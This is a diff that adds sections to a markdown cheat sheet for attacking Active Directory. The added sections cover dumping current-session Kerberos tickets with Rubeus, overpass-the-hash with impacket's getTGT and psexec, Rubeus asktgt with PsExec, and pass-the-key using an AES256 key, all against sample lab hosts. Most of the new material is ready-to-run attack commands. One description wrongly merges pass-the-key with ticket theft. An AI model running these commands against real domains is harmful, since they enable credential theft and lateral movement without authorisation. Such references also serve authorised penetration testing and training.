@@ -18,6 +18,15 @@ Modeled after GTFOBINs and LOLBAS but for attacking active directory.
 
 [Enumerating AD WITH creds](#enumerating-ad-with-creds)
 
+[Attacking Active Directory](#attacking-ad)
+
+- [Kerberoasting](#kerberoasting)
+
+- [Local Privilege Escalation](#local-priv-esc)
+
+- [Pass The Hash](#)
+
+
 
 # Basic Overview
 [back to top](#index)
@@ -508,6 +517,24 @@ proxychains bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -
 [back to top](#index)
 
 
+## Kerberoasting
+
+## Local Priv Esc
+
+Use a guide like the one here or on [Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) and use something like [Hacktricks-Windows-privesc Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
+
+## Current Session Tickets
+
+It's very unlikely that you will find tickets in the current user giving you permission to access unexpected resources, but you could check:
+
+```
+## List all tickets (if not admin, only current user tickets)
+.\Rubeus.exe triage
+## Dump the interesting one by luid
+.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
+[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
+```
+
 ## Cached Creds
 
 If you are already administrator on a domain connected machine you can dump local hashes and try and crack them, or pivot with pass or overpass the hash.
@@ -631,8 +658,9 @@ fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -s
 ./john passwordhashes.txt
 ```
 
+# Passing Hashes and keys
 
-If You can't crack them you can pass them or overpass them 
+If You can't crack those hashes you can pass them or overpass them 
 
 ## PTH From windows:
 
@@ -675,6 +703,37 @@ pth-net        pth-smbclient  pth-sqsh       pth-wmic
 
 This attack aims to use the user NTLM hash or AES keys to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.
 
+
+#### OverPass-The-Hash Via impacket
+```bash
+python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+```
+You can specify -aesKey [AES key] to specify to use AES256.
+You can also use the ticket with other tools like: as smbexec.py or wmiexec.py
+
+Possible issues
+
+- PyAsn1Error(‘NamedTypes can cast only scalar values’,) : Resolved by updating impacket to the lastest version.
+- KDC can’t found the name : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC.
+
+### OverPass-The-Hash Via rubeus/psexec
+
+```cmd
+.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
+.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+```
+
+### Pass-The-Key with Rubeus
+
+This kind of attack is similar to Pass the Key, but instead of using hashes to request for a ticket, the ticket itself is stolen and used to authenticate as its owner.
+
+*When a TGT is requested, event 4768: A Kerberos authentication ticket (TGT) was requested is generated.  You can see from the output above that the KeyType is RC4-HMAC (0x17), but the default type for Windows is now AES256 (0x12).*
+
+```cmd
+.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
+```
 
 
 
